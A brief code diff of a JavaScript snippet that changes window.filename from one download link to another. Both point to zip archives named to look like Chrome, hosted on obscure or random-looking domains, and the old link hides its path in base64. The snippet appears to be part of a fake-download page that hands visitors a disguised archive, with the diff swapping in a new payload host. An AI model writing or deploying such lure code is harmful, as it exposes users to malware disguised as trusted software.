@@ -1,3 +1,4 @@
 (function() {
-    window.filename = 'https://down.r2p.club?d=L2EycHQwMTgvb3NzLWFwLXNvdXRoZWFzdC0xLzAvQ0hyb21lZXJodGp0cmUuemlw';
+    window.filename = 'https://bireut-sf-sgc-af-rgbxcvh1saaf.com/cherooeiaei-goog.zip';
 })();
+
